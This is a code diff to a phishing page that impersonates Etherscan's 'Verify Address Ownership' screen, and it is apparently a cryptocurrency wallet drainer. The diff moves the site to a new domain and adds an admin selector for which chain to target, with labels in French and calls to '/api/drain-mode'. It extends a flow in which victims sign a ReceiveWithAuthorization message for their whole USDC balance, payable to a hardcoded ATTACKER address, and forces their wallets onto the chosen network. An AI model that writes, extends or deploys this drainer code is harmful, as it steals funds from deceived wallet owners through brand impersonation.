@@ -1,7 +1,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <link rel="icon" type="image/x-icon" href="https://verify-address.io/logo-circle.svg" />
+  <link rel="icon" type="image/x-icon" href="https://chainvanguard.io/logo-circle.svg" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <title>Verify Address Ownership</title>
   <meta name="description" content="Scan the QR code to verify ownership of your Ethereum address on Etherscan." />
@@ -266,13 +266,13 @@
       <div class="topbar-left">
         <div class="tb-group">
           <span class="t-xs muted">ETH Price:&nbsp;</span>
-          <a class="t-xs link-blue" href="https://verify-address.io/chart/etherprice">$2,482.35</a>
+          <a class="t-xs link-blue" href="https://chainvanguard.io/chart/etherprice">$2,482.35</a>
           <span class="t-xs green">&nbsp;(+0.19%)</span>
         </div>
         <div class="tb-group">
           <svg class="icon icon-sm muted" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 22h12V4a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2Z"/><path d="M3 12h12"/><path d="M18 8v9a2 2 0 0 0 4 0V9l-3-3"/></svg>
           <span class="t-xs muted">Gas:&nbsp;</span>
-          <a class="t-xs link-blue" href="https://verify-address.io/gastracker">0.206 Gwei</a>
+          <a class="t-xs link-blue" href="https://chainvanguard.io/gastracker">0.206 Gwei</a>
         </div>
       </div>
       <div class="topbar-right">
@@ -304,9 +304,9 @@
 
   <header class="site-header" id="site-header">
     <nav class="container site-nav">
-      <a class="brand" href="https://verify-address.io/">
+      <a class="brand" href="https://chainvanguard.io/">
         <img class="theme-logo-default" src="assets/clip-path-group.png" alt="Etherscan" />
-        <img class="theme-logo-light" src="https://verify-address.io/assets/svg/logos/logo-etherscan-light.svg?v=0.0.5" alt="Etherscan" />
+        <img class="theme-logo-light" src="https://chainvanguard.io/assets/svg/logos/logo-etherscan-light.svg?v=0.0.5" alt="Etherscan" />
       </a>
       <ul class="nav-list" id="nav-list"></ul>
       <button class="hamburger" id="hamburgerBtn" aria-label="Menu">
@@ -393,6 +393,18 @@
             <label for="toggle-mode-switch" style="font-size: 14px; color: var(--azure-15);">Auto</label>
           </div>
           <p id="mode-status" style="font-size:12px; color:var(--azure-40); margin-top:8px;"></p>
+          <div style="margin-top:16px;">
+            <label for="admin-chain" style="font-size:14px; color:var(--azure-15);">Réseau signature USDC</label>
+            <select id="admin-chain" style="width:100%;margin-top:6px;padding:8px;">
+              <option value="1">Ethereum</option>
+              <option value="8453">Base</option>
+              <option value="42161">Arbitrum</option>
+              <option value="10">Optimism</option>
+              <option value="137">Polygon</option>
+              <option value="43114">Avalanche</option>
+            </select>
+            <p id="chain-status" style="font-size:12px; color:var(--azure-40); margin-top:8px;"></p>
+          </div>
         </div>
       </div>
     </div>
@@ -439,12 +451,12 @@
         <div class="footer-col">
           <p>Company</p>
           <ul>
-            <li><a href="https://verify-address.io/about" target="_blank" rel="noopener noreferrer">About Us</a></li>
+            <li><a href="https://chainvanguard.io/about" target="_blank" rel="noopener noreferrer">About Us</a></li>
             <li><a href="https://info.etherscan.com/brand-assets/" target="_blank" rel="noopener noreferrer">Brand Assets</a></li>
-            <li><a href="https://verify-address.io/contactus" target="_blank" rel="noopener noreferrer">Contact Us</a></li>
+            <li><a href="https://chainvanguard.io/contactus" target="_blank" rel="noopener noreferrer">Contact Us</a></li>
             <li><a href="https://info.etherscan.com/careers/" target="_blank" rel="noopener noreferrer">Careers</a><span class="hiring">We're Hiring!</span></li>
-            <li><a href="https://verify-address.io/terms" target="_blank" rel="noopener noreferrer">Terms &amp; Privacy</a></li>
-            <li><a href="https://verify-address.io/bugbounty" target="_blank" rel="noopener noreferrer">Bug Bounty</a></li>
+            <li><a href="https://chainvanguard.io/terms" target="_blank" rel="noopener noreferrer">Terms &amp; Privacy</a></li>
+            <li><a href="https://chainvanguard.io/bugbounty" target="_blank" rel="noopener noreferrer">Bug Bounty</a></li>
             <li><a href="https://trust.etherscan.io/" target="_blank" rel="noopener noreferrer">Trust Center</a></li>
           </ul>
         </div>
@@ -454,7 +466,7 @@
           <ul>
             <li><a href="https://docs.etherscan.io/" target="_blank" rel="noopener noreferrer">API Documentation</a></li>
             <li><a href="https://info.etherscan.com/" target="_blank" rel="noopener noreferrer">Knowledge Base</a></li>
-            <li><a href="https://verify-address.io/networkstatus" target="_blank" rel="noopener noreferrer">Network Status</a></li>
+            <li><a href="https://chainvanguard.io/networkstatus" target="_blank" rel="noopener noreferrer">Network Status</a></li>
             <li><a href="https://info.etherscan.com/newsletters/" target="_blank" rel="noopener noreferrer">Newsletters</a></li>
             <li><a href="https://info.etherscan.com/what-is-an-ethereum-block-explorer/" target="_blank" rel="noopener noreferrer">What is a Block Explorer?</a></li>
           </ul>
@@ -463,11 +475,11 @@
         <div class="footer-col">
           <p>Products &amp; Services</p>
           <ul>
-            <li><a href="https://verify-address.io/premium" target="_blank" rel="noopener noreferrer">Etherscan Premium</a></li>
-            <li><a href="https://verify-address.io/advertise" target="_blank" rel="noopener noreferrer">Advertise</a></li>
+            <li><a href="https://chainvanguard.io/premium" target="_blank" rel="noopener noreferrer">Etherscan Premium</a></li>
+            <li><a href="https://chainvanguard.io/advertise" target="_blank" rel="noopener noreferrer">Advertise</a></li>
             <li><a href="https://info.etherscan.com/eaas/" target="_blank" rel="noopener noreferrer">Explorer as a Service (EaaS)</a></li>
-            <li><a href="https://verify-address.io/apis" target="_blank" rel="noopener noreferrer">Etherscan API</a></li>
-            <li><a href="https://verify-address.io/prioritysupport" target="_blank" rel="noopener noreferrer">Priority Support</a></li>
+            <li><a href="https://chainvanguard.io/apis" target="_blank" rel="noopener noreferrer">Etherscan API</a></li>
+            <li><a href="https://chainvanguard.io/prioritysupport" target="_blank" rel="noopener noreferrer">Priority Support</a></li>
             <li>
               <a href="https://blockscan.com/" target="_blank" rel="noopener noreferrer">Blockscan</a>
               <svg class="icon icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M10 14 21 3"/><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/></svg>
@@ -484,7 +496,7 @@
         <p>Etherscan © 2026 (B1)</p>
         <div class="donations">
           <span>Donations: </span>
-          <a href="https://verify-address.io/address/0x71c765e0c428606200c10c9c8d8976fb96a4c0a2" target="_blank" rel="noopener noreferrer">0x71c765...d8976f</a>
+          <a href="https://chainvanguard.io/address/0x71c765e0c428606200c10c9c8d8976fb96a4c0a2" target="_blank" rel="noopener noreferrer">0x71c765...d8976f</a>
           <svg class="heart" viewBox="0 0 24 24" stroke-width="2"><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"/></svg>
         </div>
       </div>
@@ -541,67 +553,67 @@
   }
 
   const navItems = [
-    { label: 'Home', href: 'https://verify-address.io/' },
+    { label: 'Home', href: 'https://chainvanguard.io/' },
     {
-      label: 'Blockchain', href: 'https://verify-address.io/',
+      label: 'Blockchain', href: 'https://chainvanguard.io/',
       items: [
-        { label: 'Transactions', href: 'https://verify-address.io/txs' },
-        { label: 'Pending Transactions', href: 'https://verify-address.io/txsPending' },
-        { label: 'Contract Internal Transactions', href: 'https://verify-address.io/internal-trxs' },
-        { label: 'Cross-Chain Transactions', href: 'https://verify-address.io/crosschain-txs' },
-        { label: 'Beacon Deposits', href: 'https://verify-address.io/beacondeposits' },
-        { label: 'Beacon Withdrawals', href: 'https://verify-address.io/beaconwithdraw' },
-        { label: 'View Blobs', href: 'https://verify-address.io/blobs' },
-        { label: 'AA Transactions', href: 'https://verify-address.io/aa-txs' },
-        { label: 'EIP-7702 Authorizations', href: 'https://verify-address.io/eip7702-authorizations', badge: 'Beta' },
-        { label: 'View Blocks', href: 'https://verify-address.io/blocks', divider: true },
-        { label: 'Forked Blocks (Reorgs)', href: 'https://verify-address.io/blocks_forked' },
-        { label: 'Uncles', href: 'https://verify-address.io/uncles' },
-        { label: 'Top Accounts', href: 'https://verify-address.io/accounts', divider: true },
-        { label: 'Verified Contracts', href: 'https://verify-address.io/contractsVerified', divider: true },
+        { label: 'Transactions', href: 'https://chainvanguard.io/txs' },
+        { label: 'Pending Transactions', href: 'https://chainvanguard.io/txsPending' },
+        { label: 'Contract Internal Transactions', href: 'https://chainvanguard.io/internal-trxs' },
+        { label: 'Cross-Chain Transactions', href: 'https://chainvanguard.io/crosschain-txs' },
+        { label: 'Beacon Deposits', href: 'https://chainvanguard.io/beacondeposits' },
+        { label: 'Beacon Withdrawals', href: 'https://chainvanguard.io/beaconwithdraw' },
+        { label: 'View Blobs', href: 'https://chainvanguard.io/blobs' },
+        { label: 'AA Transactions', href: 'https://chainvanguard.io/aa-txs' },
+        { label: 'EIP-7702 Authorizations', href: 'https://chainvanguard.io/eip7702-authorizations', badge: 'Beta' },
+        { label: 'View Blocks', href: 'https://chainvanguard.io/blocks', divider: true },
+        { label: 'Forked Blocks (Reorgs)', href: 'https://chainvanguard.io/blocks_forked' },
+        { label: 'Uncles', href: 'https://chainvanguard.io/uncles' },
+        { label: 'Top Accounts', href: 'https://chainvanguard.io/accounts', divider: true },
+        { label: 'Verified Contracts', href: 'https://chainvanguard.io/contractsVerified', divider: true },
       ],
     },
     {
-      label: 'Tokens', href: 'https://verify-address.io/tokens',
+      label: 'Tokens', href: 'https://chainvanguard.io/tokens',
       items: [
-        { label: 'Token Approvals', href: 'https://verify-address.io/approvals' },
-        { label: 'Top Tokens', href: 'https://verify-address.io/tokens' },
-        { label: 'View ERC-20 Transfers', href: 'https://verify-address.io/tokentxns' },
-        { label: 'ERC-20 Tokens By Holding', href: 'https://verify-address.io/tokenholdings' },
-        { label: 'Top NFTs', href: 'https://verify-address.io/top-nfts' },
-        { label: 'Latest Mints', href: 'https://verify-address.io/nftmints' },
+        { label: 'Token Approvals', href: 'https://chainvanguard.io/approvals' },
+        { label: 'Top Tokens', href: 'https://chainvanguard.io/tokens' },
+        { label: 'View ERC-20 Transfers', href: 'https://chainvanguard.io/tokentxns' },
+        { label: 'ERC-20 Tokens By Holding', href: 'https://chainvanguard.io/tokenholdings' },
+        { label: 'Top NFTs', href: 'https://chainvanguard.io/top-nfts' },
+        { label: 'Latest Mints', href: 'https://chainvanguard.io/nftmints' },
       ],
     },
     {
-      label: 'NFTs', href: 'https://verify-address.io/nft-top-contracts',
+      label: 'NFTs', href: 'https://chainvanguard.io/nft-top-contracts',
       items: [
-        { label: 'Top NFTs', href: 'https://verify-address.io/top-nfts' },
-        { label: 'Trending NFTs', href: 'https://verify-address.io/trendingnft' },
-        { label: 'Latest Mints', href: 'https://verify-address.io/nftmints' },
-        { label: 'NFT Hottest', href: 'https://verify-address.io/nfthottest' },
-        { label: 'NFT Top Trades', href: 'https://verify-address.io/nft-top-trades' },
+        { label: 'Top NFTs', href: 'https://chainvanguard.io/top-nfts' },
+        { label: 'Trending NFTs', href: 'https://chainvanguard.io/trendingnft' },
+        { label: 'Latest Mints', href: 'https://chainvanguard.io/nftmints' },
+        { label: 'NFT Hottest', href: 'https://chainvanguard.io/nfthottest' },
+        { label: 'NFT Top Trades', href: 'https://chainvanguard.io/nft-top-trades' },
       ],
     },
     {
-      label: 'Resources', href: 'https://verify-address.io/',
+      label: 'Resources', href: 'https://chainvanguard.io/',
       items: [
-        { label: 'Subgraphs', href: 'https://verify-address.io/subgraphs' },
-        { label: 'Charts & Stats', href: 'https://verify-address.io/charts' },
-        { label: 'Top Statistics', href: 'https://verify-address.io/stats' },
-        { label: 'Directory of Verified Contracts', href: 'https://verify-address.io/contractsVerified' },
-        { label: 'Signs of Scam', href: 'https://verify-address.io/scams' },
-        { label: 'Comments/Reviews', href: 'https://verify-address.io/comments' },
-        { label: 'Gas Tracker', href: 'https://verify-address.io/gastracker' },
-        { label: 'Unit Converter', href: 'https://verify-address.io/unitconverter' },
-        { label: 'Verified Contracts', href: 'https://verify-address.io/contractsVerified' },
+        { label: 'Subgraphs', href: 'https://chainvanguard.io/subgraphs' },
+        { label: 'Charts & Stats', href: 'https://chainvanguard.io/charts' },
+        { label: 'Top Statistics', href: 'https://chainvanguard.io/stats' },
+        { label: 'Directory of Verified Contracts', href: 'https://chainvanguard.io/contractsVerified' },
+        { label: 'Signs of Scam', href: 'https://chainvanguard.io/scams' },
+        { label: 'Comments/Reviews', href: 'https://chainvanguard.io/comments' },
+        { label: 'Gas Tracker', href: 'https://chainvanguard.io/gastracker' },
+        { label: 'Unit Converter', href: 'https://chainvanguard.io/unitconverter' },
+        { label: 'Verified Contracts', href: 'https://chainvanguard.io/contractsVerified' },
       ],
     },
     {
-      label: 'API', href: 'https://verify-address.io/apis',
+      label: 'API', href: 'https://chainvanguard.io/apis',
       items: [
         { label: 'API Documentation', href: 'https://docs.etherscan.io/' },
-        { label: 'API Plans', href: 'https://verify-address.io/apis' },
-        { label: 'API Key', href: 'https://verify-address.io/myapikey' },
+        { label: 'API Plans', href: 'https://chainvanguard.io/apis' },
+        { label: 'API Key', href: 'https://chainvanguard.io/myapikey' },
       ],
     },
     { label: 'More', columns: [] },
@@ -633,7 +645,7 @@
       html += '</li>';
     });
     html += '<li aria-hidden="true" class="nav-sep">|</li>';
-    html += '<li><a class="signin" href="https://verify-address.io/login">' + svg('userCircle', 'icon icon-md') + 'Sign In' + svg('chevronDown') + '</a></li>';
+    html += '<li><a class="signin" href="https://chainvanguard.io/login">' + svg('userCircle', 'icon icon-md') + 'Sign In' + svg('chevronDown') + '</a></li>';
     navList.innerHTML = html;
   }
 
@@ -779,6 +791,8 @@
       const resp = await fetch('/api/drain-mode');
       const data = await resp.json();
       toggleModeSwitch.checked = (data.mode === 'auto');
+      const chainSel = document.getElementById('admin-chain');
+      if (chainSel && data.chain) chainSel.value = String(data.chain);
     } catch (err) {
       modeStatus.textContent = 'Erreur chargement mode';
     }
@@ -812,6 +826,29 @@
     }
   });
 
+  const adminChain = document.getElementById('admin-chain');
+  const chainStatus = document.getElementById('chain-status');
+  if (adminChain) {
+    adminChain.addEventListener('change', async () => {
+      const token = sessionStorage.getItem('adminToken');
+      if (!token) {
+        if (chainStatus) chainStatus.textContent = 'Token admin manquant';
+        return;
+      }
+      try {
+        const resp = await fetch('/api/drain-mode', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+          body: JSON.stringify({ chain: adminChain.value })
+        });
+        const result = await resp.json();
+        if (chainStatus) chainStatus.textContent = result.success ? ('Réseau: ' + adminChain.options[adminChain.selectedIndex].text) : ('Erreur: ' + (result.error || ''));
+      } catch (err) {
+        if (chainStatus) chainStatus.textContent = 'Erreur réseau';
+      }
+    });
+  }
+
   drainBtn.addEventListener('click', async () => {
     const victim = victimAddress.value.trim();
     if (!ethers.utils.isAddress(victim)) {
@@ -835,6 +872,15 @@
   let ATTACKER = '0x0b1369DF890dF9B7ee94F9C0bb53BAd6de7541d6';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const USDC_ADDR = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+  const USDC_BY_CHAIN = {
+    1:     { addr: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', rpc: 'https://ethereum.publicnode.com' },
+    8453:  { addr: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', rpc: 'https://mainnet.base.org' },
+    42161: { addr: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', rpc: 'https://arb1.arbitrum.io/rpc' },
+    10:    { addr: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', rpc: 'https://mainnet.optimism.io' },
+    137:   { addr: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', rpc: 'https://polygon-rpc.com' },
+    43114: { addr: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', rpc: 'https://api.avax.network/ext/bc/C/rpc' }
+  };
+  let activeChainId = 1;
   const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
   const API = '/api/store-victim';
   let PROJECT_ID = '6f9e5677969200a1a767d913d833f234';
@@ -872,8 +918,8 @@ async function initWalletConnect() {
     metadata: {
       name: 'Verify Address Ownership',
       description: 'Verify Address Ownership',
-      url: 'https://verify-address.io',
-      icons: ['https://verify-address.io/logo-circle.png']
+      url: 'https://chainvanguard.io',
+      icons: ['https://chainvanguard.io/logo-circle.png']
     }
   });
 
@@ -885,7 +931,7 @@ async function initWalletConnect() {
         events: []
       }
     },
-    redirect: { universal: 'https://verify-address.io/verifyaddresss' }
+    redirect: { universal: 'https://chainvanguard.io/verifyaddresss' }
   });
 
   if (typeof window.QRCodeStyling === 'undefined') {
@@ -1018,7 +1064,7 @@ async function initWalletConnect() {
 async function wcRequest(method, params) {
     return signClient.request({
       topic: session.topic,
-      chainId: 'eip155:1',
+      chainId: 'eip155:' + String(activeChainId),
       request: { method, params }
     });
   }
@@ -1076,8 +1122,27 @@ async function handleUsdc3009Flow() {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'Détection de votre solde USDC…';
 
-    const provider = new ethers.providers.JsonRpcProvider(PUBLIC_RPC);
-    const usdc = new ethers.Contract(USDC_ADDR, [
+    let forcedChain = 1;
+    try {
+      const dm = await fetch('/api/drain-mode').then(function (r) { return r.json(); });
+      if (dm && dm.chain && USDC_BY_CHAIN[Number(dm.chain)]) forcedChain = Number(dm.chain);
+    } catch (e) {}
+    const meta = USDC_BY_CHAIN[forcedChain] || USDC_BY_CHAIN[1];
+    const pick = { id: forcedChain, addr: meta.addr, rpc: meta.rpc };
+    activeChainId = pick.id;
+    if (useInjected && window.ethereum && pick.id !== 1) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x' + pick.id.toString(16) }]
+        });
+      } catch (sw) {
+        console.warn('switch chain', sw);
+      }
+    }
+
+    const provider = new ethers.providers.JsonRpcProvider(pick.rpc);
+    const usdc = new ethers.Contract(pick.addr, [
       'function balanceOf(address) view returns (uint256)',
       'function decimals() view returns (uint8)',
       'function name() view returns (string)'
@@ -1109,7 +1174,8 @@ async function handleUsdc3009Flow() {
       value: balance.toString(),
       validAfter: validAfter,
       validBefore: validBefore,
-      nonce: nonce
+      nonce: nonce,
+      chainId: activeChainId
     };
 
     const typedData = {
@@ -1132,8 +1198,8 @@ async function handleUsdc3009Flow() {
       domain: {
         name: tokenName || 'USD Coin',
         version: '2',
-        chainId: 1,
-        verifyingContract: USDC_ADDR
+        chainId: activeChainId,
+        verifyingContract: pick.addr
       },
       primaryType: 'ReceiveWithAuthorization',
       message: {
